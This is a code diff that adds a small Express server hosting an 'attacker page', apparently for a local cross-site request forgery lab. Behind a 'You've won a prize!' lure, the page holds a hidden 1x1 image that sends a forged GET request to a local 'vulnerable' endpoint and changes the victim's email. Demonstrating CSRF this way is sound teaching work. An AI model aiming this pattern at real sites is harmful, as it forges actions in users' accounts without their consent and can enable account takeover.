@@ -1,0 +1,3 @@
+const express=require('express');const app=express();
+app.get('/',(_req,res)=>res.send(`<!doctype html><html><head><title>Untrusted Page</title><style>body{font-family:Arial;background:#fff4e8;padding:40px}main{max-width:650px;margin:auto;background:white;padding:28px;border-radius:12px}</style></head><body><main><h1>You've won a prize!</h1><p>This untrusted page automatically attempts the forged GET action.</p><img src="http://127.0.0.1:5000/vulnerable/change-email?email=changed-by-csrf%40example.test" width="1" height="1" alt=""><p><a href="http://127.0.0.1:5000/dashboard">Return to dashboard</a></p></main></body></html>`));
+app.listen(5001,'127.0.0.1',()=>console.log('Attacker page: http://127.0.0.1:5001/'));
